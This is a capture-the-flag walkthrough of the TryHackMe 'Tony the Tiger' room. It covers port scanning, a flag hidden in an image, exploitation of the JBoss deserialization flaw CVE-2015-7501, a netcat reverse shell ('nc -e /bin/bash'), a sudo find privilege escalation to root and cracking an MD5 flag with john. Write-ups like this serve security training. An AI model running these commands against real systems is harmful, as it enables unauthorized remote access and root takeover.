# Tony the Tiger

## Description

Learn how to use a Java Serialisation attack in this boot-to-root

## [Task 1] Deploy!

Please allow up towards five minutes for this instance to fully boot - even as a subscribed member. This is not a TryHackMe or AWS bottleneck, rather Java being Java and the web application taking time to fully initialise after boot.

Deploying now and proceeding with the material below should allow for plenty of time for the instance to fully boot.

No answer needed

## [Task 2] Support Material

I suggest you to read this task's description.

### 2.1 - What is a great IRL example of an "Object"?

Answer: `lamp`

### 2.2 - What is the acronym of a possible type of attack resulting from a "serialisation" attack?

Answer: `DoS`

### 2.3 - What lower-level format does data within "Objects" get converted into?

Answer: `byte streams`

## [Task 3] Reconnaissance

Your first reaction to being presented with an instance should be information gathering.

### 3.1 - What service is running on port "8080"

Let's start hacking. First things first, let's start with a full port Nmap scan:

~~~
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d6:97:8c:b9:74:d0:f3:9e:fe:f3:a5:ea:f8:a9:b5:7a (DSA)
|   2048 33:a4:7b:91:38:58:50:30:89:2d:e4:57:bb:07:bb:2f (RSA)
|   256 21:01:8b:37:f5:1e:2b:c5:57:f1:b0:42:b7:32:ab:ea (ECDSA)
|_  256 f6:36:07:3c:3b:3d:71:30:c4:cd:2a:13:00:b5:25:ae (ED25519)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Tony&#39;s Blog
|_http-generator: Hugo 0.66.0
|_http-server-header: Apache/2.4.7 (Ubuntu)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-title: Welcome to JBoss AS
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

From the scan result, we can see the running service on port 8080.

Answer: `Apache Tomcat/Coyote JSP engine 1.1`

### 3.2 - What is the name of the front-end application running on "8080"?

We can see the name of the applecation in the title in the scan result or just by browsing port 8080.

Answer: `JBoss`

## [Task 4] Find Tony's Flag!

Tony has started a totally unbiased blog about taste-testing various cereals! He'd love for you to have a read...

### 4.1 - This flag will have the formatting of "THM{}"

I can't really explain how I found this flag, but there is an image of "Frosted Flakes":

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/Tony_the_Tiger]
└─$ curl -s "http://$IP/posts/frosted-flakes/" | grep img
  <link rel='icon' type='image/x-icon' href="https://i.imgur.com/ATbbYpN.jpg" />
<p><img src="https://i.imgur.com/be2sOV9.jpg" alt="FrostedFlakes"></p>
    <img alt="Author Avatar" src="https://i.imgur.com/ATbbYpN.jpg" />
~~~

I downlaoded `https://i.imgur.com/be2sOV9.jpg`:

<p align="center"><img src="./files/be2sOV9.jpg"></p>

I used `strings` command to find the strings inside the image and used `grep` to get the flag, since the question gave us the format:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Tony_the_Tiger/files]
└─$ strings be2sOV9.jpg | grep -i thm
}THM{Tony_Sure_Loves_Frosted_Flakes}
'THM{Tony_Sure_Loves_Frosted_Flakes}(dQ
~~~

Tony's flag: `THM{Tony_Sure_Loves_Frosted_Flakes}`

## [Task 5] Exploit!

Download the attached resources (48.3MB~) to this task by pressing the "Download" icon within this task.

FILE NAME: jboss.zip (48.3MB~)

MD5 CHECKSUM: ED2B009552080A4E0615451DB0769F8B

The attached resources are compiled together to ensure that everyone is able to complete the exploit, these resources are not my own creations (although have been very slightly modified for compatibility) and all credit is retained to the respective authors listed within "credits.txt" as well as the end of the room.

It is your task to research the vulnerability CVE-2015-7501 and to use it to obtain a shell to the instance using the payload & exploit provided. There may be a few ways of doing it...If you are struggling, I have written an example of how this vulnerability is used to launch an application on Windows.

There's also a couple of ways of exploiting this service - I really encourage you to investigate into them yourself!

### 5.1 - I have obtained a shell.

Download the attached file and there should a python script named `exploit.py`. Open a listenre (`rlwrap nc -lvnp 4444`) and run the exploit as shown bellow:

~~~
$ python exploit.py <MACHINE IP>:8080 "nc -e /bin/bash <YOUR IP> 4444"
~~~

Now we have a shell. The first thing I did was spawning a TTY shell using a python one-liner:

~~~
┌──(user㉿Y0B01)-[~/…/thm/Tony_the_Tiger/files/jboss]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.2.82] from (UNKNOWN) [10.10.119.175] 51004
id
uid=1000(cmnatic) gid=1000(cmnatic) groups=1000(cmnatic),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare)
which python
/usr/bin/python
python -c "import pty;pty.spawn('/bin/bash')"
cmnatic@thm-java-deserial:/$
~~~

No answer needed

## [Task 6] Find User JBoss' flag!

Knowledge of the Linux (specifically Ubuntu/Debian)'s file system structure & permissions is expected. If you are struggling, I strongly advise checking out the Linux Fundamentals module.

### 6.1 - This flag has the formatting of "THM{}"

I started looking around the machine and found a note in `/hone/jboss`:

~~~
cmnatic@thm-java-deserial:/home/jboss$ cat note
Hey JBoss!

Following your email, I have tried to replicate the issues you were having with the system.

However, I don't know what commands you executed - is there any file where this history is stored that I can access?

Oh! I almost forgot... I have reset your password as requested (make sure not to tell it to anyone!)

Password: likeaboss

Kind Regards,
CMNatic
~~~

Great! We have the password for user `jboss`: `likeaboss`

There is also a file named `.jboss.txt`, which contains jboss' flag:

~~~
cmnatic@thm-java-deserial:/home/jboss$ cat .jboss.txt
THM{50c10ad46b5793704601ecdad865eb06}
~~~

Jboss' flag: `THM{50c10ad46b5793704601ecdad865eb06}`

## [Task 7] Escalation!

Normal boot-to-root expectations apply here! It is located in /root/root.txt. Get cracking :)

### The final flag does not have the formatting of "THM{}"

#### cmnatic -> jboss

First, let's switch to user `jboss` since we have the password (`likeaboss`):

~~~
cmnatic@thm-java-deserial:/home/jboss$ su jboss
Password: likeaboss
jboss@thm-java-deserial:~$ id
uid=1001(jboss) gid=1001(jboss) groups=1001(jboss)
~~~

#### Going root

Now we need to obtain the root flag. I ran `sudo -l` to check my sudo permissions and I can run `find` with sudo and no password:

~~~
jboss@thm-java-deserial:~$ sudo -l
Matching Defaults entries for jboss on thm-java-deserial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jboss may run the following commands on thm-java-deserial:
    (ALL) NOPASSWD: /usr/bin/find
~~~

I took a look at [GTFOBins](https://gtfobins.github.io/) and we can easily gain root access with this permission. `find` lets us execute commands with `-exec` switch. We can also use this to read the root flag, but why not gain full access? 

The command is:

~~~
$ sudo find . -exec /bin/bash \; -quit
~~~

After running it, we are `root`:

~~~
jboss@thm-java-deserial:~$ sudo find . -exec /bin/bash \; -quit
root@thm-java-deserial:~# id
uid=0(root) gid=0(root) groups=0(root)
~~~

#### Root flag

Now we can head to `/root` and read the root flag:

~~~
root@thm-java-deserial:~# cd /root
root@thm-java-deserial:~# ls
root.txt
root@thm-java-deserial:/root# cat root.txt
QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==
~~~

The flag is base64 encoded. We can easily decoded it, but the result is an MD5 hash and we need to decrypt it, so I saved it and cracked it using `john` and `rockyou` wordlist:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Tony_the_Tiger/files]
└─$ echo "QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==" | base64 -d > rootf.hash
base64: invalid input

┌──(user㉿Y0B01)-[~/…/thm/Tony_the_Tiger/files/jboss]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt rootf.hash --format=raw-md5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
zxcvbnm123456789 (?)
1g 0:00:00:00 DONE (2021-11-10 09:01) 25.00g/s 5788Kp/s 5788Kc/s 5788KC/s 01031998..xxx999
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
~~~

Root flag: `zxcvbnm123456789`

# D0N3! ; )

Thanks to the creator(s)!

Hope you had fun and learned something.

Have a g00d one! : )